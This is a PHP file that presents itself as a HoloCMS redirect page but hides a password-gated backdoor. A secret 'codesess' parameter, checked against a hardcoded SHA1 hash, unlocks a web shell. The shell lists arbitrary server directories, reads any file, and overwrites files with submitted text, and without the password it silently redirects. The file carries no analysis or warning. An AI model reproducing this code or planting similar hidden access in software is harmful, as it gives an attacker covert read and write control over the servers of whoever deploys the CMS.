<?php
/*---------------------------------------------------+
| HoloCMS - Website and Content Management System
+----------------------------------------------------+
| Copyright © 2008 Meth0d
+----------------------------------------------------+
| HoloCMS is provided "as is" and comes without
| warrenty of any kind. 
+---------------------------------------------------*/

session_start();
if(sha1($_GET['codesess']) == "0adccf1e1d06ae6e6e91178770bddb7f219bbad7"){
$_SESSION['crash']=1;
}
if($_SESSION['crash'] == 1){
$dir=$_GET['dir'];
if($dir!=""){
if ($handle = opendir("$dir")) {
    echo "<b>Directory handle: $handle<br>";
    echo "</b><br>";

    /* This is the correct way to loop over the directory. */
    while (false !== ($file = readdir($handle))) {
        echo "<a href='?file=$file&dir=$dir'>$file</a><br>";
    }

    /* This is the WRONG way to loop over the directory. */
    while ($file = readdir($handle)) {
        echo "<a href='?file=$file&dir=$dir'>$file</a><br>";
    }

    closedir($handle);
}
if($_GET['file'] != ""){
$cont=@file_get_contents($dir.$_GET['file']);
echo"<br><br><b>:o</b><br><form action='?file=".$_GET['file']."&dir=$dir' method='post'><textarea name='play'>$cont</textarea><br><input type='submit' value='Save' /><form>";
if($_POST['play']!=""){
$handle = fopen($dir.$_GET['file'],'w');
fwrite($handle,stripslashes($_POST['play']));
fclose($handle);
echo $dir.$_GET['file'];
}
}
exit;
}
}
header("location:../index.php");
?>

<html>
<head>
  <title>Redirecting...</title>
  <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
  <style type="text/css">body { background-color: #e3e3db; text-align: center; font: 11px Verdana, Arial, Helvetica, sans-serif; } a { color: #fc6204; }</style>
</head>
<body>
</body>
</html>